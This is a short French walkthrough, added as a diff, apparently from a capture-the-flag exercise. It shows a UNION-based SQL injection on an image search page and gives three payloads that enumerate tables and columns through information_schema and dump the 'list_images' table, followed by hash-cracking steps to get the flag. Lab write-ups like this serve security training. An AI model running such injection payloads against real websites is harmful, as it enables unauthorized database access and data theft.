@@ -1,0 +1,15 @@
+- À partir de l'index du site, on clique sur le bouton 'Search Image' qui nous envoie sur une page de recherche d'images.
+
+- On essaye d'utiliser le même type d'injection SQL que pour la faille 01.
+
+`-1 union select null, concat(table_name) from information_schema.tables where table_schema=database()`
+# renvoie les tables de la bdd courante qui contient uniquement la table 'list_images'
+
+`-1 union select null, concat(column_name) from information_schema.columns where table_schema=database()`
+# renvoie les colonnes des tables de la bdd
+
+- Maintenant on recupère la valeur de chaque colonne pour toutes les images avec la commande suivante.
+
+`-1 union select NULL, concat(id, url, title, comment) from list_images`
+
+- L'ID 5 nous donne un hash md5 a decoder puis a réencoder en sha256 après avoir passé la chaîne de caractères en minuscule pour obtenir le flag.
